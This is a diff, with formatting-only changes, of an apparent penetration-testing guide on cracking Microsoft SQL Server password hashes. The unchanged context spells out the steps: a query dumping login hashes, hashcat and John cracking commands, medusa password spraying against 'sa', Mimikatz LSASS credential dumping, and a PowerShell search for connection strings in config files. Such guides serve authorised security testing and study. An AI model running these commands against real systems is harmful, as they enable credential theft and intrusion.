@@ -17,9 +17,9 @@ Before attempting to crack SQL Server password hashes, it's important to identif
 
 | SQL Server Version | Hash Format | Example |
 |-------------------|-------------|---------|
-| SQL Server 2000 | 0x0100[16-byte hash] | 0x0100B58E58130D2B6FF57F70737D3978 |
-| SQL Server 2005+ | 0x0200[SHA-1 hash][salt] | 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B |
-| SQL Server 2012+ | 0x0200[SHA-512 hash][salt] | (longer hash with same prefix) |
+| SQL Server 2000 | 0x0100\[16-byte hash\] | 0x0100B58E58130D2B6FF57F70737D3978 |
+| SQL Server 2005+ | 0x0200\[SHA-1 hash\]\[salt\] | 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B |
+| SQL Server 2012+ | 0x0200\[SHA-512 hash\]\[salt\] | (longer hash with same prefix) |
 
 ### Cracking Tools
 
@@ -122,7 +122,7 @@ SQL Server hashes often need to be reformatted for cracking tools:
 
 #### SQL Server 2000 Format
 
-```
+```plaintext
 # Original format
 0x0100B58E58130D2B6FF57F70737D3978
 
@@ -132,7 +132,7 @@ SQL Server hashes often need to be reformatted for cracking tools:
 
 #### SQL Server 2005+ Format
 
-```
+```plaintext
 # Original format
 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B
 
@@ -192,23 +192,27 @@ john --format=mssql05 --session=sqlserver mssql_hashes.txt
 ### Real-World Attack Workflow
 
 1. **Extract hashes**:
+
    ```sql
    -- Extract all hashes to a file
    SELECT 'sa:0x' + CONVERT(varchar(max), password_hash, 2) FROM sys.sql_logins;
    ```
 
 2. **Format hashes properly**:
+
    ```bash
    # Script to convert SQL Server 2005+ hashes to hashcat format
    cat sql_hashes.txt | sed 's/0x0200\([0-9A-F]*\)/0200\1/g' | sed 's/\(.\{40\}\)\(.*\)/\1:\2/g' > formatted_hashes.txt
    ```
 
 3. **Run cracking tools**:
+
    ```bash
    hashcat -m 132 -a 0 formatted_hashes.txt rockyou.txt -r rules/best64.rule
    ```
 
 4. **Check results**:
+
    ```bash
    hashcat -m 132 formatted_hashes.txt --show
    ```
@@ -230,17 +234,20 @@ john --format=mssql05 --session=sqlserver mssql_hashes.txt
 When hash cracking is difficult, consider:
 
 1. **Password Spraying**: Attempting common passwords against multiple accounts
+
    ```bash
    medusa -h target -u sa -P common_passwords.txt -M mssql
    ```
 
 2. **Keylogging/Memory Dumping**: On compromised servers, extract credentials from memory
+
    ```bash
    # Using Mimikatz to extract from LSASS memory
    mimikatz "sekurlsa::logonpasswords" exit
    ```
 
 3. **Credential Theft from Configuration Files**: Many applications store SQL Server credentials in config files
+
    ```bash
    # Example PowerShell search for connection strings
    Get-ChildItem -Path C:\ -Recurse -Include *.config -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString" -SimpleMatch
